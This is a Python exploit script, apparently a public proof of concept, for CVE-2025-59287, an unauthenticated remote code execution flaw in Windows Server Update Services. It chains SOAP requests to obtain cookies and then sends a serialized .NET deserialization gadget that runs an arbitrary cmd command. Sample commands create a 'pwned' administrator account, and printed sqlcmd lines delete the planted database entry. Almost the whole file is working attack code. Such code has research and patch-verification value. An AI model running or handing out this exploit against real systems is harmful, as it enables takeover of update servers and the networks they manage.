#!/usr/bin/env python3
# -*- coding: utf-8 -*- 
r''' 
    Copyright 2025 Photubias(c)

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.

    File name CVE-2025-59287-Photubias.py
    
    This script performs some OPSEC Safe checks on any WSUS installation to verify if it is vulnerable to
    CVE-2025-59287: Unauthenticated Remote Code Execution
    And then offers the option to send a custom payload, without requiring "YSoSerial"

    BE AWARE: 
    #    - The exploit crashes the WSUS MMC snap-in (wsusservice.exe)
    #    - The payload might take up to 10 minutes to spawn
    #    - The payload respawns every 10 minutes
    #    - The delivery method might be captured by Windows Defender
    ## Payload will be served as a parameter after "cmd /c PAYLOAD"
    ## Don't use double quotes (") or chained commands. Combine commands by re-running the exploit.
    ## TODO: add encoding/encryption to serve longer payloads
'''

import requests, uuid, urllib3, datetime, base64, struct, optparse
import xml.etree.ElementTree as ET
from xml.sax.saxutils import escape

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

dctProxies = {'http':'127.0.0.1:8080','https':'127.0.0.1:8080'}

## This string acts as a template for the serialization (contains "###payload###" to be replaced and a size location)
sSerialTemplate = 'AAEAAAD/////AQAAAAAAAAAMAgAAAF5NaWNyb3NvZnQuUG93ZXJTaGVsbC5FZGl0b3IsIFZlcnNpb249My4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1BQEAAABCTWljcm9zb2Z0LlZpc3VhbFN0dWRpby5UZXh0LkZvcm1hdHRpbmcuVGV4dEZvcm1hdHRpbmdSdW5Qcm9wZXJ0aWVzAQAAAA9Gb3JlZ3JvdW5kQnJ1c2gBAgAAAAYDAAAAswU8P3htbCB2ZXJzaW9uPSIxLjAiIGVuY29kaW5nPSJ1dGYtMTYiPz4NCjxPYmplY3REYXRhUHJvdmlkZXIgTWV0aG9kTmFtZT0iU3RhcnQiIElzSW5pdGlhbExvYWRFbmFibGVkPSJGYWxzZSIgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sL3ByZXNlbnRhdGlvbiIgeG1sbnM6c2Q9ImNsci1uYW1lc3BhY2U6U3lzdGVtLkRpYWdub3N0aWNzO2Fzc2VtYmx5PVN5c3RlbSIgeG1sbnM6eD0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwiPg0KICA8T2JqZWN0RGF0YVByb3ZpZGVyLk9iamVjdEluc3RhbmNlPg0KICAgIDxzZDpQcm9jZXNzPg0KICAgICAgPHNkOlByb2Nlc3MuU3RhcnRJbmZvPg0KICAgICAgICA8c2Q6UHJvY2Vzc1N0YXJ0SW5mbyBBcmd1bWVudHM9Ii9jICMjI3BheWxvYWQjIyMiIFN0YW5kYXJkRXJyb3JFbmNvZGluZz0ie3g6TnVsbH0iIFN0YW5kYXJkT3V0cHV0RW5jb2Rpbmc9Int4Ok51bGx9IiBVc2VyTmFtZT0iIiBQYXNzd29yZD0ie3g6TnVsbH0iIERvbWFpbj0iIiBMb2FkVXNlclByb2ZpbGU9IkZhbHNlIiBGaWxlTmFtZT0iY21kIiAvPg0KICAgICAgPC9zZDpQcm9jZXNzLlN0YXJ0SW5mbz4NCiAgICA8L3NkOlByb2Nlc3M+DQogIDwvT2JqZWN0RGF0YVByb3ZpZGVyLk9iamVjdEluc3RhbmNlPg0KPC9PYmplY3REYXRhUHJvdmlkZXI+Cw=='
sDefTarget = 'http://192.168.50.130:8530'
## 8530 == http, 8531 == https

def getServerId(sTarget,dctProxies):
    sURL = f'{sTarget}/ReportingWebService/ReportingWebService.asmx'
    dctHeaders = {
        'SOAPAction': '"http://www.microsoft.com/SoftwareDistribution/GetRollupConfiguration"',
        'Content-Type': 'text/xml'
    }

    sSoapBody = '''<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<GetRollupConfiguration xmlns="http://www.microsoft.com/SoftwareDistribution">
<cookie xmlns:i="http://www.w3.org/2001/XMLSchema-instance" i:nil="true"/>
</GetRollupConfiguration>
</soap:Body>
</soap:Envelope>'''

    try:
        oResp = requests.post(sURL, data=sSoapBody, headers=dctHeaders, timeout=30, verify=False, proxies=dctProxies)
        oResp.raise_for_status()
        
        ## It seems patch KB5070881 (on Server 2025 at least) removes a header "Vary: Accept-Encoding" from all responses, TODO: test on other systems (e.g. Server 2022)
        #if 'Vary' in oResp.headers: print('     Hint: Probably a vulnerable server, based on response headers')
        #else: print('     Hint: This server is probably patched, based on response headers')

        oRoot = ET.fromstring(oResp.text)
        for oElem in oRoot.iter():
            if 'ServerId' in oElem.tag and oElem.text:
                print(f'[+] Server ID: {oElem.text}')
                return oElem.text

    except requests.exceptions.RequestException as e: print(f'[-] Request Exception: {str(e)}')
    except ET.ParseError as e: print(f'[-] XML Parse issue: {str(e)}')

    sFallbackId = str(uuid.uuid4())
    print(f'[!] fallback id: {sFallbackId}')
    return sFallbackId

def getAuthCookie(sTarget, dctProxies, sServerId = None):
    sURL = f'{sTarget}/SimpleAuthWebService/SimpleAuth.asmx'
    dctHeaders = {
        'SOAPAction': '"http://www.microsoft.com/SoftwareDistribution/Server/SimpleAuthWebService/GetAuthorizationCookie"',
        'Content-Type': 'text/xml'
    }

    if sServerId is None: sServerId = str(uuid.uuid4())

    sSoapBody = f'''<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<GetAuthorizationCookie xmlns="http://www.microsoft.com/SoftwareDistribution/Server/SimpleAuthWebService">
<clientId>{sServerId}</clientId>
<targetGroupName></targetGroupName>
<dnsName>photubias.vulndemo.local</dnsName>
</GetAuthorizationCookie>
</soap:Body>
</soap:Envelope>'''

    try:
        oResp = requests.post(sURL, data=sSoapBody, headers=dctHeaders, timeout=30, verify=False, proxies=dctProxies)
        oResp.raise_for_status()  # Triggered HTTP error status code exception

        # Parsing the response to extract CookieData
        oRoot = ET.fromstring(oResp.text)
        for oElem in oRoot.iter():
            if 'CookieData' in oElem.tag and oElem.text:
                print(f'[+] Got Cookie for : {sServerId}')
                return oElem.text

    except requests.exceptions.RequestException as e: print(f'[-] Error running request : {str(e)}')
    except ET.ParseError as e: print(f'[-] Error parsing XML: {str(e)}')

    return None

def getReportingCookie(sTarget, sAuthCookie, dctProxies):
    sURL = f'{sTarget}/ClientWebService/Client.asmx'
    dctHeaders = {
        'SOAPAction': '"http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/GetCookie"',
        'Content-Type': 'text/xml'
    }

    sDateTimeNow = datetime.datetime.now(datetime.timezone.utc).strftime('%Y-%m-%dT%H:%M:%SZ')

    sSoapBody = f'''<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<GetCookie xmlns="http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService">
<authCookies>
<AuthorizationCookie>
<PlugInId>SimpleTargeting</PlugInId>
<CookieData>{sAuthCookie}</CookieData>
</AuthorizationCookie>
</authCookies>
<oldCookie xmlns:i="http://www.w3.org/2001/XMLSchema-instance" i:nil="true"/>
<lastChange>{sDateTimeNow}</lastChange>
<currentTime>{sDateTimeNow}</currentTime>
<protocolVersion>1.20</protocolVersion>
</GetCookie>
</soap:Body>
</soap:Envelope>'''

    try:
        oResp = requests.post(sURL, data=sSoapBody, headers=dctHeaders, timeout=30, verify=False, proxies=dctProxies)
        oResp.raise_for_status()

        oRoot = ET.fromstring(oResp.text)
        dctCookieData = {}
        for oElem in oRoot.iter():
            if 'Expiration' in oElem.tag: dctCookieData['expiration'] = oElem.text
            elif 'EncryptedData' in oElem.tag: dctCookieData['encrypted_data'] = oElem.text

        if 'encrypted_data' in dctCookieData: return dctCookieData

    except requests.exceptions.RequestException as e: print(f'[-] Error requesting cookie: {str(e)}')
    except ET.ParseError as e: print(f'[-] Error parsing XML: {str(e)}')

    return None

def sendExploit(sTarget, dctCookie, sPayload, dctProxies):
    sURL = f'{sTarget}/ReportingWebService/ReportingWebService.asmx'

    # Generate Random ID and Timestamp
    sTargetSID = str(uuid.uuid4())
    sEventInstanceID = str(uuid.uuid4())
    sDateTimeNow = datetime.datetime.now(datetime.timezone.utc).strftime('%Y-%m-%dT%H:%M:%S.%f')[:-3]

    # Prepare payload
    sFullPayload = f'''<SOAP-ENV:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:clr="http://schemas.microsoft.com/soap/encoding/clr/1.0" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><SOAP-ENV:Body><a1:DataSet id="ref-1" xmlns:a1="http://schemas.microsoft.com/clr/nsassem/System.Data/System.Data%2C%20Version%3D4.0.0.0%2C%20Culture%3Dneutral%2C%20PublicKeyToken%3Db77a5c561934e089"><DataSet.RemotingFormat xsi:type="a1:SerializationFormat" xmlns:a1="http://schemas.microsoft.com/clr/nsassem/System.Data/System.Data%2C%20Version%3D4.0.0.0%2C%20Culture%3Dneutral%2C%20PublicKeyToken%3Db77a5c561934e089">Binary</DataSet.RemotingFormat><DataSet.DataSetName id="ref-3"></DataSet.DataSetName><DataSet.Namespace href="#ref-3"/><DataSet.Prefix href="#ref-3"/><DataSet.CaseSensitive>false</DataSet.CaseSensitive><DataSet.LocaleLCID>1033</DataSet.LocaleLCID><DataSet.EnforceConstraints>false</DataSet.EnforceConstraints><DataSet.ExtendedProperties xsi:type="xsd:anyType" xsi:null="1"/><DataSet.Tables.Count>1</DataSet.Tables.Count><DataSet.Tables_0 href="#ref-4"/></a1:DataSet><SOAP-ENC:Array id="ref-4" xsi:type="SOAP-ENC:base64">{sPayload}</SOAP-ENC:Array></SOAP-ENV:Body></SOAP-ENV:Envelope>'''
    if len(sPayload)<10: sFullPayload = sPayload

    # Prepare SOAP body
    sSoapBody = f'''<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/">
<soap:Body>
<ReportEventBatch xmlns="http://www.microsoft.com/SoftwareDistribution">
<cookie>
<Expiration>{dctCookie['expiration']}</Expiration>
<EncryptedData>{dctCookie['encrypted_data']}</EncryptedData>
</cookie>
<clientTime>{sDateTimeNow}</clientTime>
<eventBatch xmlns:q1="http://www.microsoft.com/SoftwareDistribution" soapenc:arrayType="q1:ReportingEvent[1]">
<ReportingEvent>
<BasicData>
<TargetID>
<Sid>{sTargetSID}</Sid>
</TargetID>
<SequenceNumber>0</SequenceNumber>
<TimeAtTarget>{sDateTimeNow}</TimeAtTarget>
<EventInstanceID>{sEventInstanceID}</EventInstanceID>
<NamespaceID>2</NamespaceID>
<EventID>389</EventID>
<SourceID>301</SourceID>
<UpdateID>
<UpdateID>00000000-0000-0000-0000-000000000000</UpdateID>
<RevisionNumber>0</RevisionNumber>
</UpdateID>
<Win32HResult>0</Win32HResult>
<AppName>LocalServer</AppName>
</BasicData>
<ExtendedData>
<MiscData soapenc:arrayType="xsd:string[2]">
<string>Administrator=SYSTEM</string>
<string>SynchronizationUpdateErrorsKey={escape(sFullPayload)}</string>
</MiscData>
</ExtendedData>
<PrivateData>
<ComputerDnsName></ComputerDnsName>
<UserAccountName></UserAccountName>
</PrivateData>
</ReportingEvent>
</eventBatch>
</ReportEventBatch>
</soap:Body>
</soap:Envelope>'''

    sHost = sTarget.replace('http://', '').replace('https://', '')
    dctHeaders = {
        'Connection': 'Keep-Alive',
        'Content-Type': 'text/xml',
        'Accept': 'text/xml',
        'User-Agent': 'Windows-Update-Agent',
        'SOAPAction': '"http://www.microsoft.com/SoftwareDistribution/ReportEventBatch"',
        'Host': sHost
    }

    try:
        oResp = requests.post(sURL, data=sSoapBody, headers=dctHeaders, timeout=30, verify=False, proxies=dctProxies)
        oResp.raise_for_status()

        if 'true' in oResp.text:
            return True, sEventInstanceID, sTargetSID
        else:
            print(f'[-] Malicious event sending failed, response content: {oResp.text[:200]}')
            return False, None, None

    except requests.exceptions.RequestException as e:
        print(f'[-] HTTP Request failed: {str(e)}')
        return False, None, None

def getPayload(sCommand):
    def convertInt(iInput, length): return bytes.fromhex(struct.pack('<I' , int(iInput)).hex()[:length])
    bCustomPayload = base64.b64decode(sSerialTemplate).replace(b'###payload###',sCommand.encode())
    iLength2 = 1455 + len(sCommand)
    bLength2 = convertInt(iLength2, 4) ## Turns b'1234' into b'3412'
    bPayload = bCustomPayload[:0xdb] + bLength2 + bCustomPayload[0xdd:]
    sPayload = base64.b64encode(bPayload).decode()
    return sPayload

def main(sTarget, sCmd, boolProxy):
    if not boolProxy: dctProxies = {}
    print('[i] Retrieving server ID')
    sServerID = getServerId(sTarget, dctProxies)

    print('[i] Retrieving authentication cookie using server ID')
    sAuthCookie = getAuthCookie(sTarget, dctProxies, sServerID)
    if not sAuthCookie: 
        print('[-] Error getting auth cookie')
        return
    #print(sAuthCookie)

    print('[i] Retrieving report service cookie')
    sReportingCookie = getReportingCookie(sTarget, sAuthCookie, dctProxies)
    if not sReportingCookie:
        print('[-] Unable to obtain report service cookie, not a WSUS server. Exiting process.')
        return
    #print(sReportingCookie)
    
    sAnswer = input('[?] Ready to send a verification (empty, OPSEC SAFE) payload? [y/N]: ')
    if not 'y' in sAnswer.lower(): exit()
    ## NOTE  : "AAAA" does not break the WSUS CMD GUI, but does show up in the WSUS Database. 
    ## NOTE 2: "" (empty payload) also does not break anything BUT it seems to be also accepted even after the KB5070881 UPDATE ??
    sPayload = 'AAAA'
    boolSuccess, sEventID, sTargetSID = sendExploit(sTarget, sReportingCookie, sPayload, dctProxies) 
    if not boolSuccess: 
        print('[-] Target seems to be patched')
        exit()
    else:
        print('[+] Target seems to be vulnerable')
        print('     Want proof? Download sqlcmd.exe to the victim and run this command, it should list a "SynchronizationUpdateErrorsKey=AAAA" value')
        print(r'       sqlcmd -S \\.\pipe\Microsoft##WID\tsql\query -y0 -Q "SELECT TOP (2) EventInstanceID,TimeAtServer,MiscData FROM [SUSDB].[dbo].[tbEventInstance] ORDER BY TimeAtServer Desc"')
        print('     Remove the entry?')
        print('       sqlcmd -S \\\\.\\pipe\\Microsoft##WID\\tsql\\query -y0 -Q "DELETE FROM [SUSDB].[dbo].[tbEventInstance] WHERE EventInstanceID = \'{}\'"'.format(sEventID))
    
    if not sCmd: return
    
    sAnswer = input('[?] Ready to send malicious payload? [y/N]: ')
    if not 'y' in sAnswer.lower(): exit()
    print('[+] Preparing payload')

    ### cmd /c calc, from ysoserial
    # sPayload = 'AAEAAAD/////AQAAAAAAAAAMAgAAAF5NaWNyb3NvZnQuUG93ZXJTaGVsbC5FZGl0b3IsIFZlcnNpb249My4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1BQEAAABCTWljcm9zb2Z0LlZpc3VhbFN0dWRpby5UZXh0LkZvcm1hdHRpbmcuVGV4dEZvcm1hdHRpbmdSdW5Qcm9wZXJ0aWVzAQAAAA9Gb3JlZ3JvdW5kQnJ1c2gBAgAAAAYDAAAAswU8P3htbCB2ZXJzaW9uPSIxLjAiIGVuY29kaW5nPSJ1dGYtMTYiPz4NCjxPYmplY3REYXRhUHJvdmlkZXIgTWV0aG9kTmFtZT0iU3RhcnQiIElzSW5pdGlhbExvYWRFbmFibGVkPSJGYWxzZSIgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sL3ByZXNlbnRhdGlvbiIgeG1sbnM6c2Q9ImNsci1uYW1lc3BhY2U6U3lzdGVtLkRpYWdub3N0aWNzO2Fzc2VtYmx5PVN5c3RlbSIgeG1sbnM6eD0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwiPg0KICA8T2JqZWN0RGF0YVByb3ZpZGVyLk9iamVjdEluc3RhbmNlPg0KICAgIDxzZDpQcm9jZXNzPg0KICAgICAgPHNkOlByb2Nlc3MuU3RhcnRJbmZvPg0KICAgICAgICA8c2Q6UHJvY2Vzc1N0YXJ0SW5mbyBBcmd1bWVudHM9Ii9jIGNhbGMiIFN0YW5kYXJkRXJyb3JFbmNvZGluZz0ie3g6TnVsbH0iIFN0YW5kYXJkT3V0cHV0RW5jb2Rpbmc9Int4Ok51bGx9IiBVc2VyTmFtZT0iIiBQYXNzd29yZD0ie3g6TnVsbH0iIERvbWFpbj0iIiBMb2FkVXNlclByb2ZpbGU9IkZhbHNlIiBGaWxlTmFtZT0iY21kIiAvPg0KICAgICAgPC9zZDpQcm9jZXNzLlN0YXJ0SW5mbz4NCiAgICA8L3NkOlByb2Nlc3M+DQogIDwvT2JqZWN0RGF0YVByb3ZpZGVyLk9iamVjdEluc3RhbmNlPg0KPC9PYmplY3REYXRhUHJvdmlkZXI+Cw=='
    # sCommand = r'''echo test > C:\test.txt'''
    # sCommand = r'''net user pwned Server2025- /add'''
    # sCommand = r'''net localgroup administrators pwned /add''' 
    sCommand = sCmd
    sPayload = getPayload(sCommand)

    boolSuccess, sEventID, sTargetSID = sendExploit(sTarget, sReportingCookie, sPayload, dctProxies)

    if boolSuccess:
        print('[+] Exploit successful')
        print('[!] Remote code execution may have been triggered, execution might take a couple of minutes')
        print('      sqlcmd -S \\\\.\\pipe\\Microsoft##WID\\tsql\\query -y0 -Q "DELETE FROM [SUSDB].[dbo].[tbEventInstance] WHERE EventInstanceID = \'{}\'"'.format(sEventID))
    else:
        print('[-] Exploit failed')

if __name__ == '__main__':
    sUsage = ('usage: %prog [options]\n'
              'Checker & Exploit for WSUS Unauth RCE CVE-2025-59287\n'
              'Does not require YSoserial\n'
              'Example: %prog -t {} -c "net user pwned Server2025- /add"'.format(sDefTarget))
    oParser = optparse.OptionParser(usage = sUsage)
    oParser.add_option('--target', '-t', dest='target', metavar='STRING', help='Target address, must start with http, required')
    oParser.add_option('--command', '-c', dest='command', metavar='STRING', help='Command to execute')
    oParser.add_option('--proxy', dest='proxy', action='store_true', help='Set proxy to 127.0.0.1:8080. Default False', default=False)
    (oOptions, lstArgs) = oParser.parse_args()
    if oOptions.target == '': exit('[-] Error, target required')
    if not oOptions.target.lower().startswith('http'): exit('[-] Error, target must start with http/https')
    sTarget = oOptions.target
    print(f'### Target: {sTarget} ###')
    main(sTarget, oOptions.command, oOptions.proxy)
    exit(0)
